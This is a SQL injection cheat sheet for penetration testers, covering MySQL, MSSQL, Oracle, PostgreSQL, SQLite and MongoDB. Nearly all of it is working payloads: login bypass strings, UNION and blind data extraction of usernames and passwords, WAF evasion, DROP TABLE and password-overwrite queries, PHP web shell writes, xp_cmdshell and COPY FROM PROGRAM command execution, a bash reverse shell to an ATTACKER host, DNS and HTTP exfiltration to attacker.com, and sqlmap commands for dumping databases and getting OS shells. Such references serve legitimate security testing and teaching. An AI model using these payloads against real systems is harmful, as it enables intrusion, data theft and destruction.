# SQL Injection Cheat Sheet
> **For authorized penetration testing and security research only.**

---

## Table of Contents
1. [Detection & Fingerprinting](#1-detection--fingerprinting)
2. [Authentication Bypass](#2-authentication-bypass)
3. [UNION-Based Injection](#3-union-based-injection)
4. [Error-Based Injection](#4-error-based-injection)
5. [Blind Boolean-Based Injection](#5-blind-boolean-based-injection)
6. [Blind Time-Based Injection](#6-blind-time-based-injection)
7. [Stacked Queries](#7-stacked-queries)
8. [Out-of-Band (OOB) Injection](#8-out-of-band-oob-injection)
9. [Second-Order Injection](#9-second-order-injection)
10. [WAF / Filter Evasion](#10-waf--filter-evasion)
11. [Database Enumeration](#11-database-enumeration)
12. [File Read / Write](#12-file-read--write)
13. [OS Command Execution](#13-os-command-execution)
14. [JSON / XML Contexts](#14-json--xml-contexts)
15. [NoSQL Injection (MongoDB)](#15-nosql-injection-mongodb)
16. [Common Wordlist Payloads](#16-common-wordlist-payloads)
17. [SQLMap Quick Reference](#17-sqlmap-quick-reference)

---

## 1. Detection & Fingerprinting

### Basic probes
```
'
''
`
')
"))
' OR '1'='1
' OR 1=1--
" OR 1=1--
# (MySQL comment)
-- (ANSI comment)
/*comment*/
;--
'/*
```

### Error triggers (DB fingerprinting)
```sql
-- MySQL
' AND EXTRACTVALUE(1, CONCAT(0x7e, VERSION())) --
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --

-- MSSQL
' AND 1=CONVERT(int, @@VERSION) --
'; SELECT @@VERSION --

-- Oracle
' AND 1=1 FROM dual --
' UNION SELECT NULL FROM dual --
' AND (SELECT UTL_HTTP.REQUEST('http://attacker.com') FROM dual) IS NOT NULL --

-- PostgreSQL
' AND 1=CAST(VERSION() AS int) --
'; SELECT pg_sleep(5) --

-- SQLite
' AND 1=CAST(sqlite_version() AS int) --
```

### DB-specific syntax markers
| DB         | Comment      | String concat      | Version function   |
|------------|-------------|--------------------|--------------------|
| MySQL      | `-- ` / `#` | `CONCAT(a,b)`      | `VERSION()`        |
| MSSQL      | `--`        | `a + b`            | `@@VERSION`        |
| Oracle     | `--`        | `a \|\| b`         | `v$version`        |
| PostgreSQL | `--`        | `a \|\| b`         | `VERSION()`        |
| SQLite     | `--`        | `a \|\| b`         | `sqlite_version()` |

---

## 2. Authentication Bypass

```sql
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'/*
' OR 1=1--
' OR 1=1#
' OR 1=1/*
admin'--
admin' #
admin'/*
' OR 'x'='x
') OR ('1'='1
')) OR (('1'='1
' OR ''='
" OR ""="
' OR 1 --+
'OR 1=1--
' OR 1=1 LIMIT 1--
' OR 1=1 LIMIT 1#
'or'1'='1
'or 1=1 or ''='
" or "1"="1
" or "1"="1"--
" or "1"="1"/*
" or 1=1--
" or 1=1#
') or '1'='1'--
') or ('1'='1'--
'||'1'='1
'||1=1--

-- Admin-specific
admin' --
admin' #
admin'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or 1=1--
admin" --
admin" or "1"="1
```

---

## 3. UNION-Based Injection

### Column count discovery
```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' ORDER BY N-- (increment until error)

' GROUP BY 1--
' GROUP BY 2--
```

### NULL probing
```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION ALL SELECT NULL--
' UNION ALL SELECT NULL,NULL--
```

### Data extraction (2 columns)
```sql
' UNION SELECT username,password FROM users--
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
```

### Single-column concatenation
```sql
-- MySQL
' UNION SELECT CONCAT(username,0x3a,password) FROM users--
' UNION SELECT GROUP_CONCAT(username,':',password SEPARATOR '\n') FROM users--

-- MSSQL
' UNION SELECT username+':'+password FROM users--

-- Oracle
' UNION SELECT username||':'||password FROM users FROM dual--

-- PostgreSQL
' UNION SELECT username||':'||password FROM users--
```

### Type juggling (string in numeric column)
```sql
' UNION SELECT 'a',NULL--
' UNION SELECT NULL,'a'--
' UNION SELECT NULL,NULL,'a'--
```

---

## 4. Error-Based Injection

### MySQL
```sql
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))--
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database())),1)--
' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
' AND ROW(1,1)>(SELECT COUNT(*),CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),0x3a,FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)--
```

### MSSQL
```sql
' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
' AND 1=CONVERT(int,db_name())--
'; DECLARE @q NVARCHAR(4000); SET @q=N'SELECT '+db_name(); EXEC(@q)--
```

### Oracle
```sql
' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--
' OR 1=UTL_INADDR.GET_HOST_NAME((SELECT banner FROM v$version WHERE ROWNUM=1))--
```

### PostgreSQL
```sql
' AND 1=CAST((SELECT version()) AS int)--
' AND 1=(SELECT 1 FROM pg_sleep(0) WHERE 1=CAST((SELECT current_database()) AS int))--
```

---

## 5. Blind Boolean-Based Injection

### True / False conditions
```sql
' AND 1=1--    (true)
' AND 1=2--    (false)
' AND 'a'='a'--
' AND 'a'='b'--
```

### Character-by-character extraction
```sql
-- MySQL
' AND SUBSTRING((SELECT database()),1,1)='a'--
' AND ASCII(SUBSTRING((SELECT database()),1,1))>96--
' AND ASCII(SUBSTRING((SELECT database()),1,1))=109--

-- MSSQL
' AND SUBSTRING((SELECT db_name()),1,1)='a'--
' AND ASCII(SUBSTRING((SELECT db_name()),1,1))>96--

-- Oracle
' AND SUBSTR((SELECT user FROM dual),1,1)='A'--

-- PostgreSQL
' AND SUBSTRING((SELECT current_database()),1,1)='a'--
```

### Regex / LIKE shortcuts
```sql
' AND (SELECT database()) LIKE 'a%'--
' AND (SELECT database()) REGEXP '^a'--   -- MySQL
' AND (SELECT database()) SIMILAR TO 'a%'-- -- PostgreSQL
```

---

## 6. Blind Time-Based Injection

### MySQL
```sql
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
' AND IF(ASCII(SUBSTRING((SELECT database()),1,1))=109,SLEEP(5),0)--
'; SELECT SLEEP(5)--
```

### MSSQL
```sql
'; WAITFOR DELAY '0:0:5'--
' IF (1=1) WAITFOR DELAY '0:0:5'--
' IF (ASCII(SUBSTRING(db_name(),1,1))=109) WAITFOR DELAY '0:0:5'--
```

### Oracle
```sql
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 1/0 END FROM dual)=1--
```

### PostgreSQL
```sql
'; SELECT pg_sleep(5)--
' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--
' AND 1=(SELECT 1 FROM pg_sleep(5))--
```

### SQLite
```sql
' AND RANDOMBLOB(500000000/1)--  (CPU burn delay)
```

---

## 7. Stacked Queries

> Supported by MSSQL, PostgreSQL, MySQL (via multi-query drivers). **Not Oracle.**

```sql
-- MSSQL
'; INSERT INTO users (username,password) VALUES ('hacked','hacked')--
'; DROP TABLE users--
'; EXEC xp_cmdshell('whoami')--

-- MySQL (PDO / multi_query)
'; UPDATE users SET password='hacked' WHERE '1'='1'--
'; INSERT INTO users VALUES ('hacked','hacked@x.com','hacked')--

-- PostgreSQL
'; CREATE TABLE cmd_exec(cmd_output text)--
'; COPY cmd_exec FROM PROGRAM 'id'--
'; SELECT * FROM cmd_exec--
```

---

## 8. Out-of-Band (OOB) Injection

### MySQL – DNS exfil via LOAD_FILE
```sql
' AND LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.attacker.com\\x'))--
```

### MSSQL – DNS via xp_dirtree
```sql
'; EXEC master..xp_dirtree '\\attacker.com\share'--
'; DECLARE @d VARCHAR(255); SET @d=(SELECT db_name()); EXEC('master..xp_dirtree ''\\'+@d+'.attacker.com\x''')--
```

### Oracle – HTTP via UTL_HTTP
```sql
' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual)) FROM dual--
```

### PostgreSQL – DNS via COPY
```sql
'; COPY (SELECT '') TO PROGRAM 'nslookup attacker.com'--
```

---

## 9. Second-Order Injection

Second-order (stored) SQLi occurs when user input is safely stored then later unsafely used in a query.

**Attack pattern:**
1. Register username: `admin'--`
2. Application stores it safely.
3. Later query unsafely builds: `SELECT * FROM users WHERE username='admin'--'`

**Common injection points:**
```
Username / display name fields
Profile bios
Search history / saved searches
Password reset flows
Email fields
Address fields
```

---

## 10. WAF / Filter Evasion

### Case variation
```sql
SeLeCt UsErNaMe FrOm UsErS
sElEcT*fRoM(sElEcT*fRoM(uSeRs))
```

### Comment insertion
```sql
SE/**/LECT
UN/**/ION SEL/**/ECT
' OR/**/1=1--
'/**/OR/**/1=1--
```

### URL encoding
```
%27 OR %271%27=%271
%27%20OR%20%271%27%3D%271
%2527 (double-encode)
```

### Hex encoding (MySQL)
```sql
' UNION SELECT 0x61646d696e--  -- hex for 'admin'
CONCAT(CHAR(117),CHAR(115),CHAR(101),CHAR(114))  -- 'user'
```

### Whitespace alternatives
```sql
'%09OR%091=1--   (tab)
'%0aOR%0a1=1--   (newline)
'%0dOR%0d1=1--   (carriage return)
'%0cOR%0c1=1--   (form feed)
'+OR+1=1--
'/**/OR/**/1=1--
```

### Keyword substitution
```sql
-- Avoid UNION SELECT
' UNION ALL SELECT
' UNION DISTINCT SELECT
'/*!UNION*//*!SELECT*/

-- Avoid OR
' || 1=1--
' OORR 1=1--  (double keyword trick with some filters)

-- Avoid AND
' && 1=1--
' AANDND 1=1--
```

### Nested quotes / escape tricks
```sql
''OR''1''=''1
\'OR 1=1--
\' OR 1=1--
```

### Scientific notation (numeric fields)
```sql
1e0 UNION SELECT ...
1.0e0 UNION SELECT ...
```

---

## 11. Database Enumeration

### MySQL
```sql
-- Databases
SELECT schema_name FROM information_schema.schemata;
SELECT database();

-- Tables
SELECT table_name FROM information_schema.tables WHERE table_schema=database();
SELECT table_name FROM information_schema.tables WHERE table_schema='target_db';

-- Columns
SELECT column_name FROM information_schema.columns WHERE table_name='users';

-- Data
SELECT GROUP_CONCAT(username,0x3a,password) FROM users;

-- Privileges
SELECT * FROM information_schema.user_privileges;
SELECT user,authentication_string FROM mysql.user;

-- Current user
SELECT user();
SELECT current_user();

-- File privilege check
SELECT file_priv FROM mysql.user WHERE user=user();
```

### MSSQL
```sql
-- Databases
SELECT name FROM master..sysdatabases;
SELECT db_name();

-- Tables
SELECT table_name FROM information_schema.tables;
SELECT name FROM sysobjects WHERE xtype='U';

-- Columns
SELECT column_name FROM information_schema.columns WHERE table_name='users';

-- Data
SELECT username+':'+password FROM users;

-- Users & roles
SELECT loginame FROM master..sysprocesses WHERE spid=@@spid;
SELECT name FROM sysusers;
EXEC sp_helplogins;

-- Linked servers
EXEC sp_linkedservers;
SELECT * FROM sys.servers;
```

### Oracle
```sql
-- Databases / schemas
SELECT owner FROM all_tables;
SELECT * FROM v$database;

-- Tables
SELECT table_name FROM all_tables WHERE owner='APP';
SELECT table_name FROM user_tables;

-- Columns
SELECT column_name FROM all_tab_columns WHERE table_name='USERS';

-- Data
SELECT username||':'||password FROM users;

-- Users
SELECT username FROM all_users;
SELECT * FROM dba_users;
```

### PostgreSQL
```sql
-- Databases
SELECT datname FROM pg_database;
SELECT current_database();

-- Tables
SELECT table_name FROM information_schema.tables WHERE table_schema='public';
SELECT tablename FROM pg_catalog.pg_tables WHERE schemaname='public';

-- Columns
SELECT column_name FROM information_schema.columns WHERE table_name='users';

-- Data
SELECT string_agg(username||':'||password,'\n') FROM users;

-- Users
SELECT usename,passwd FROM pg_shadow;
SELECT current_user;
SELECT session_user;
```

---

## 12. File Read / Write

### MySQL
```sql
-- Read
' UNION SELECT LOAD_FILE('/etc/passwd')--
' UNION SELECT LOAD_FILE('/var/www/html/config.php')--
' UNION SELECT LOAD_FILE(0x2f6574632f706173737764)--  (hex path)

-- Write (requires FILE privilege + writable dir)
' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--
' UNION SELECT '' INTO DUMPFILE '/var/www/html/shell.php'--
```

### MSSQL
```sql
-- Read via OPENROWSET / BULK
SELECT BulkColumn FROM OPENROWSET(BULK 'C:\Windows\win.ini', SINGLE_BLOB) AS x

-- Write via xp_cmdshell
'; EXEC xp_cmdshell 'echo ^<?php system($_GET["cmd"]); ?^> > C:\inetpub\wwwroot\shell.php'--
```

### PostgreSQL
```sql
-- Read
SELECT pg_read_file('/etc/passwd');
COPY users FROM '/etc/passwd';

-- Write
COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php';
```

---

## 13. OS Command Execution

### MSSQL – xp_cmdshell
```sql
'; EXEC xp_cmdshell 'whoami'--
'; EXEC xp_cmdshell 'net user'--
'; EXEC xp_cmdshell 'powershell -e <base64payload>'--

-- Enable xp_cmdshell if disabled
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE;--
'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--
```

### MySQL – UDF (User Defined Function)
```sql
-- After uploading UDF .so/.dll
CREATE FUNCTION sys_exec RETURNS int SONAME 'lib_mysqludf_sys.so';
SELECT sys_exec('id');
SELECT sys_eval('id');
```

### PostgreSQL – COPY FROM PROGRAM
```sql
'; DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text)--
'; COPY cmd_exec FROM PROGRAM 'id'--
'; SELECT * FROM cmd_exec--
'; COPY cmd_exec FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"'--
```

---

## 14. JSON / XML Contexts

### JSON column injection (PostgreSQL / MySQL 5.7+)
```sql
-- PostgreSQL JSON operator
' OR (SELECT data->>'password' FROM secrets LIMIT 1)='x' OR '1'='
-- MySQL JSON_EXTRACT
' OR JSON_EXTRACT(data,'$.password')='x' OR '1'='
```

### XML / XPath injection
```xml
' OR 1=1 or 'x'='x
' or count(/*)=1 or 'x'='y
' or string-length(name(/*[1]))=6 or 'x'='y
' or substring(name(/*[1]),1,1)='a' or 'x'='y
```

---

## 15. NoSQL Injection (MongoDB)

### Operator injection (JSON body)
```json
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$in": ["admin","administrator","root"]}, "password": {"$gt": ""}}
{"username": {"$regex": "admin"}, "password": {"$gt": ""}}
{"$where": "1==1"}
{"$where": "sleep(5000)"}
```

### URL parameter injection
```
?username[$ne]=foo&password[$ne]=foo
?username[$gt]=&password[$gt]=
?username[$regex]=admin.*&password[$gt]=
?username[$where]=1==1&password[$where]=1==1
```

---

## 16. Common Wordlist Payloads

> Compact list suitable for fuzzing / automated tools.

```
'
''
`
')
'))
")
"))
\
%27
%22
%60
%27%27
' OR '1'='1
' OR 1=1--
" OR 1=1--
' OR 1=1#
' OR 1=1/*
') OR ('1'='1
')) OR (('1'='1
' OR 'x'='x
' OR ''='
1' OR '1'='1
1 OR 1=1
1' OR 1=1--
1" OR 1=1--
1 OR 1=1--
1' AND SLEEP(5)--
1 AND SLEEP(5)--
1'; WAITFOR DELAY '0:0:5'--
1' AND 1=CONVERT(int,@@VERSION)--
1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 1,2,3--
' UNION SELECT 1,2,3,4--
' UNION ALL SELECT NULL--
' UNION ALL SELECT NULL,NULL--
' UNION SELECT username,password FROM users--
' UNION SELECT table_name,NULL FROM information_schema.tables--
' AND 1=1--
' AND 1=2--
' AND 'a'='a
' AND 'a'='b
admin'--
admin' #
admin'/*
admin' OR '1'='1
admin' OR 1=1--
1;DROP TABLE users--
';DROP TABLE users--
1; SELECT * FROM users--
'; SELECT * FROM users--
1' ORDER BY 1--
1' ORDER BY 2--
1' ORDER BY 3--
1' GROUP BY 1--
1' GROUP BY 2--
0'XOR(if(now()=sysdate(),sleep(5),0))XOR'Z
0"XOR(if(now()=sysdate(),sleep(5),0))XOR"Z
IF(7842=7842,SLEEP(5),0)
' AND IF(1=1,SLEEP(5),0)--
1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
'; EXEC xp_cmdshell('whoami')--
'; EXEC master..xp_dirtree '\\attacker.com\share'--
' AND LOAD_FILE('/etc/passwd')--
' INTO OUTFILE '/var/www/shell.php'--
```

---

## 17. SQLMap Quick Reference

```bash
# Basic detection
sqlmap -u "http://target.com/page?id=1"

# POST request
sqlmap -u "http://target.com/login" --data="username=admin&password=test"

# With cookie
sqlmap -u "http://target.com/page?id=1" --cookie="PHPSESSID=abc123"

# Custom header
sqlmap -u "http://target.com/api" -H "Authorization: Bearer <token>"

# Enumerate databases
sqlmap -u "http://target.com/page?id=1" --dbs

# Enumerate tables
sqlmap -u "http://target.com/page?id=1" -D target_db --tables

# Dump table
sqlmap -u "http://target.com/page?id=1" -D target_db -T users --dump

# All databases / all tables
sqlmap -u "http://target.com/page?id=1" --dump-all

# OS shell
sqlmap -u "http://target.com/page?id=1" --os-shell

# File read
sqlmap -u "http://target.com/page?id=1" --file-read="/etc/passwd"

# File write
sqlmap -u "http://target.com/page?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"

# Bypass WAF
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment,between,randomcase

# Level / risk tuning (max aggression)
sqlmap -u "http://target.com/page?id=1" --level=5 --risk=3

# Time-based only
sqlmap -u "http://target.com/page?id=1" --technique=T

# From Burp request file
sqlmap -r request.txt -p id --dbs

# Random user-agent + delay
sqlmap -u "http://target.com/page?id=1" --random-agent --delay=2

# Proxy through Burp
sqlmap -u "http://target.com/page?id=1" --proxy="http://127.0.0.1:8080"

# Batch mode (no prompts)
sqlmap -u "http://target.com/page?id=1" --batch --dbs
```

### Useful tamper scripts
| Tamper            | Purpose                              |
|-------------------|--------------------------------------|
| `space2comment`   | Replace spaces with `/**/`           |
| `between`         | Replace `>` with `NOT BETWEEN 0 AND` |
| `randomcase`      | Random case of keywords              |
| `base64encode`    | Base64-encode the payload            |
| `charencode`      | URL-encode characters                |
| `charunicodeescape` | Unicode-escape characters          |
| `equaltolike`     | Replace `=` with `LIKE`             |
| `greatest`        | Replace `>` with `GREATEST()`       |
| `ifnull2ifisnull` | Replace `IFNULL` with `IF(ISNULL())` |
| `modsecurityversioned` | Add versioned comments          |
| `percentage`      | Add `%` before each character        |
| `sleep2getlock`   | Replace `SLEEP` with `GET_LOCK`     |

---

*Last updated: 2026 | For use in authorized security assessments only.*
